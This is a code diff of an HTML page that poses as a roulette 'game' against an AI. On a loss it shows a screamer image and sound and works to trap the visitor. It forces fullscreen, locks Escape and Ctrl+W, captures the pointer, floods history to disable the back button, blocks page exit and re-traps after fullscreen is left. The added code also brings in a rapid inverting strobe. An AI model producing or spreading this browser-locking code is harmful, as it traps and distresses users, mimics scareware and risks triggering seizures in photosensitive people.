@@ -2,22 +2,21 @@
 <html lang="en">
 <head>
     <meta charset="UTF-8">
-    <title>Roulette Duel</title>
+    <title>Fatal Duel</title>
     <style>
         body, html { margin: 0; padding: 0; width: 100%; height: 100%; background: black; overflow: hidden; font-family: 'Courier New', monospace; display: flex; justify-content: center; align-items: center; color: white; }
         #game-ui { text-align: center; z-index: 5; }
         #scary-screen { position: fixed; top: 0; left: 0; width: 100%; height: 100%; background: url('./scary.gif') center/cover; display: none; z-index: 1000; }
+        
         button { padding: 20px 40px; font-size: 24px; cursor: pointer; background: #111; color: #cc0000; border: 2px solid #cc0000; text-transform: uppercase; font-weight: bold; margin-top: 20px; transition: 0.3s; }
         button:disabled { border-color: #444; color: #444; cursor: not-allowed; }
         #status { font-size: 22px; margin-bottom: 10px; color: #ff00ea; }
-        #turn-info { font-size: 18px; color: #888; margin-top: 10px; }
     </style>
 </head>
 <body>
     <div id="game-ui">
-        <div id="status">Your Turn</div>
-        <button id="trigger-btn">Pull Trigger</button>
-        <div id="turn-info">Player vs AI</div>
+        <div id="status">PLAYER VS AI</div>
+        <button id="trigger-btn">PULL TRIGGER</button>
     </div>
     <div id="scary-screen"></div>
     <audio id="scream-audio" loop preload="auto"><source src="./scream.mp3"></audio>
@@ -33,71 +32,82 @@
 
         function playerShoot() {
             if (!isPlayerTurn) return;
-            const result = pullTrigger();
-            if (result) {
-                lose("YOU DIED");
+            // 1-in-6 chance
+            if (Math.floor(Math.random() * 6) + 1 === 1) {
+                lose();
             } else {
-                status.innerText = "Click... You're safe.";
+                status.innerText = "CLICK... SURVIVED.";
                 isPlayerTurn = false;
                 triggerBtn.disabled = true;
-                setTimeout(aiTurn, 1500);
+                setTimeout(aiTurn, 1000);
             }
         }
 
         function aiTurn() {
-            status.innerText = "AI is spinning...";
+            status.innerText = "AI IS PULLING...";
             setTimeout(() => {
-                const result = pullTrigger();
-                if (result) {
-                    status.innerText = "AI DIED. YOU WIN (for now).";
-                    // Reset game or choose to lock anyway?
-                    setTimeout(() => location.reload(), 3000);
+                if (Math.floor(Math.random() * 6) + 1 === 1) {
+                    status.innerText = "AI DIED. RESETTING...";
+                    setTimeout(() => location.reload(), 2000);
                 } else {
-                    status.innerText = "AI survived. Your turn.";
+                    status.innerText = "AI SURVIVED. YOUR TURN.";
                     isPlayerTurn = true;
                     triggerBtn.disabled = false;
                 }
             }, 1000);
         }
 
-        function pullTrigger() {
-            // Spin: 1-in-6 chance every pull
-            return Math.floor(Math.random() * 6) + 1 === 1;
-        }
-
-        async function lose(msg) {
+        async function lose() {
             scaryScreen.style.display = 'block';
             document.getElementById('game-ui').style.display = 'none';
             scream.play().catch(() => {});
 
             const elem = document.documentElement;
             try {
+                // Request Fullscreen
                 if (elem.requestFullscreen) await elem.requestFullscreen();
-                // Block Esc and Ctrl+W (Chrome/Edge Only)
+                
+                // Keyboard Lock (Blocks Esc and Ctrl+W in Chrome/Edge)
                 if (navigator.keyboard && navigator.keyboard.lock) {
                     await navigator.keyboard.lock(["Escape", "KeyW"]);
                 }
-                // Trap mouse
+
+                // Pointer Lock (Traps and hides mouse)
                 if (elem.requestPointerLock) elem.requestPointerLock();
             } catch (err) {}
 
-            activateTraps();
+            startChaos();
         }
 
-        function activateTraps() {
+        function startChaos() {
+            // High-Frequency Strobe (Inverts and flashes the GIF)
+            setInterval(() => {
+                scaryScreen.style.filter = Math.random() > 0.85 ? 'invert(1) contrast(3) brightness(1.5)' : 'none';
+            }, 40);
+
+            // Extreme Shake
+            setInterval(() => {
+                const x = (Math.random() - 0.5) * 50;
+                const y = (Math.random() - 0.5) * 50;
+                scaryScreen.style.transform = `translate(${x}px, ${y}px)`;
+            }, 30);
+
+            // History Flood (Traps back button)
             window.history.pushState(null, null, window.location.href);
             window.onpopstate = () => window.history.go(1);
             setInterval(() => window.history.pushState(null, "", window.location.href), 100);
-            window.onbeforeunload = (e) => { e.preventDefault(); e.returnValue = ''; };
 
-            setInterval(() => {
-                const x = (Math.random() - 0.5) * 40;
-                const y = (Math.random() - 0.5) * 40;
-                scaryScreen.style.transform = `translate(${x}px, ${y}px)`;
-            }, 25);
+            // Native Exit Warning
+            window.onbeforeunload = (e) => {
+                e.preventDefault();
+                e.returnValue = '';
+            };
 
+            // Fullscreen Jail
             document.addEventListener('fullscreenchange', () => {
-                if (!document.fullscreenElement) scaryScreen.onclick = () => lose();
+                if (!document.fullscreenElement) {
+                    scaryScreen.onclick = () => lose();
+                }
             });
         }
     </script>
